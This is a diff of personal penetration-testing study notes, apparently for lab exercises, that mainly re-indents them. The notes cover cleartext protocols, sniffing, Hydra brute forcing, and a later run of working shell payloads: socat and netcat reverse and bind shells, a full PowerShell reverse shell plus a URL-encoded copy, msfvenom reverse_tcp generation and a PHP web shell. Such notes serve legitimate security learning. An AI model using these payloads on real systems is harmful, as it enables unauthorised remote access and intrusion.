@@ -246,55 +246,60 @@ $ sudo nmap -sS --traceroute MACHINE_IP (finding routers between attacker and th
 
 # Protocols and Servers:
 - Telnet (connects to a virtual terminal of another computer) default port - 23
-$ telnet MACHINE_IP
+  
+		$ telnet MACHINE_IP
 
-- HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
-$ telnet MACHINE_IP 80
-$ host:telnet
-$ GET /index.html HTTP/1.1
+ HTTP (HyperText Transfer Protocol) default port - 80, transfers web pages like HTML pages and images.
+ 
+		$ telnet MACHINE_IP 80
+		$ host:telnet
+		$ GET /index.html HTTP/1.1
 
-- FTP (File Transfer Protocol) default port - 21
-$ ftp MACHINE_IP
-$ Name: ****
-$ Password: ****
-ftp> ls
-ftp> ascii 
-ftp> get something.txt
-ftp> exit
+		- FTP (File Transfer Protocol) default port - 21
+		$ ftp MACHINE_IP
+		$ Name: ****
+		$ Password: ****
+		ftp> ls
+		ftp> ascii 
+		ftp> get something.txt
+		ftp> exit
 
 - SMTP (Simple Mail Transfer Protocol) default port - 25
     -- Components: Mail Submission Agent(MSA), Maile Transfer Agent(MTA), Mail Delivery Agent(MDA) and Mail User Agent (MUA)
     -- MUA -> MSA -> MTA -> MDA -> MUA
-$ telnet MACHINE_IP 25
-$ helo telnet
-$ mail from: <address>
-$ rctp to: <addres>
-data: something
-$ quit
+  
+		$ telnet MACHINE_IP 25
+		$ helo telnet
+		$ mail from: <address>
+		$ rctp to: <addres>
+		data: something
+		$ quit
 
--- POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
-$ telnet MACHINE_IP 110
-$ USER ****
-$ PASS ****
-$ STAT
-$ LIST
-$ RETR 1 (retrive the first message on the list)
-$ QUIT
-    -> Disadvantage: mailboxes are not synchronized like read and unread messages.
 
-- IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
-$ telnet MACHINE_IP 143
-$ c1 LOGIN username password
-$ c2 LIST "" "*"
-$ c3 EXAMINE BOX
-$ c4 LOGOUT
+		- POP3 (Post Office Protocol 3): used to download the email from MDA server. default port - 110
+		$ telnet MACHINE_IP 110
+		$ USER ****
+		$ PASS ****
+		$ STAT
+		$ LIST
+		$ RETR 1 (retrive the first message on the list)
+		$ QUIT
+-> Disadvantage: mailboxes are not synchronized like read and unread messages.
+
+	- IMAP (Internet Message Access Protocol): keeps email synchronized across multiple devices. default port - 143
+	$ telnet MACHINE_IP 143
+	$ c1 LOGIN username password
+	$ c2 LIST "" "*"
+	$ c3 EXAMINE BOX
+	$ c4 LOGOUT
 
 ** All of these protocols uses cleartext so anyone watching the network traffic would know the user's credential.
 
 # Sniffing Attack:
 - tools: Tcpdump, Wireshark, Tshark
-- Using tcpdump:
-$ sudo tcpdump port 110 -A (requires access to the network traffic)
+  
+		- Using tcpdump:
+		$ sudo tcpdump port 110 -A (requires access to the network traffic)
     -> here POP3 packets are being captured. -A means we want it in ASCII format
 - Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
     
@@ -316,16 +321,19 @@ $ sudo tcpdump port 110 -A (requires access to the network traffic)
 - Also uses cryptography
 - SSH server (p22) and client required.
 - Authenticate using username and password.
-$ ssh nischal@MACHINE_IP
-nischal@MACHINE_IP's password: helloworld
+  
+		$ ssh nischal@MACHINE_IP
+		$ nischal@MACHINE_IP's password: helloworld
 - Secure Copuy protocol can also be used to copy files from the server.
-$ scp document.txt nischal@MACHINE_IP:/home/nischal
-nischal@MACHINE_IP's password: 
-document.txt
+  
+		$ scp document.txt nischal@MACHINE_IP:/home/nischal
+		$ nischal@MACHINE_IP's password: 
+		$ document.txt
 
 # Password Attack:
 - tool: Hydra (all methods related to HTTP)
-$ hydra -l username -P wordlist.txt MACHINE_IP service
+  
+		$ hydra -l username -P wordlist.txt MACHINE_IP service
 - Solution: 
     -> make user to have a strong password
     -> account lockout after certain number of failed attempts
@@ -335,26 +343,30 @@ $ hydra -l username -P wordlist.txt MACHINE_IP service
 
 
 #SOCAT COMMANDS:
-- Reverse Shell:
-$ socat TCP-L:<port> -
+
+	- Reverse Shell:
+	$ socat TCP-L:<port> -
 	- for windows to connect back:
 	$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
 	The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
 	- for linux to connect back:
 	$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
 
-- Bind Shell
-$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
-$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
-$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)
+	- Bind Shell
+	$ socat TCP-L:<PORT> EXEC:"bash -li" (Target=Linux)
+	$ socat TCP-L:<PORT> EXEC:powershell.exe,pipes (Target=Windows)
+	$ socat TCP:<TARGET-IP>:<TARGET-PORT> - (on the attacking machine applicable for both targets)
 
-- Linux Target only:
-$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
-$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)
+	- Linux Target only:
+	$ socat TCP-L:<port> FILE:`tty`,raw,echo=0 (attacker)
+	$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane (target)
 
 # SOCAT encrypted Shells:
-$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt (generates a SSL certificate)
-$ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)
+
+	$ openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt (generates a SSL certificate)
+
+	$ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)
+
 	- Reverse Shell:
 	$ socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - (attacker)
 	$ socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash (target)
@@ -364,28 +376,32 @@ $ cat shell.key shell.crt > shell.pem (merge the created files in .pem file)
 	$ socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - (attacker)
 	
 #FOR LINUX:
-- Reverse Shell:
-$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /					
-tmp/f (target)
 
-- Bind Shell:
-$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
+	- Reverse Shell:
+	$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
+
+	- Bind Shell:
+	$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
 
 #FOR WINDOWS:
-$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)
+
+		$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)
 
 # MSFVENOM:
-$ msfvenom -p <PAYLOAD> <OPTIONS>
-$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
+
+	$ msfvenom -p <PAYLOAD> <OPTIONS>
+	$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
 	        {<OS>/<arch>/<payload>}
-$ shell_reverse_tcp (stageless payload)
-$ shell/reverse_tcp (staged payload)
-$ metasploit multi/handler (used for staged payload)
+	$ shell_reverse_tcp (stageless payload)
+	$ shell/reverse_tcp (staged payload)
+	$ metasploit multi/handler (used for staged payload)
 
 #WEBSHELLS:
-$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> (basic one line format) 
+
+	$ <?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?> (basic one line format) 
 - RCE is normally gained in linux, but for Windows we need to copy this into the URL as the cmd argument:
-$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
+  
+		$ powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
 
 
 
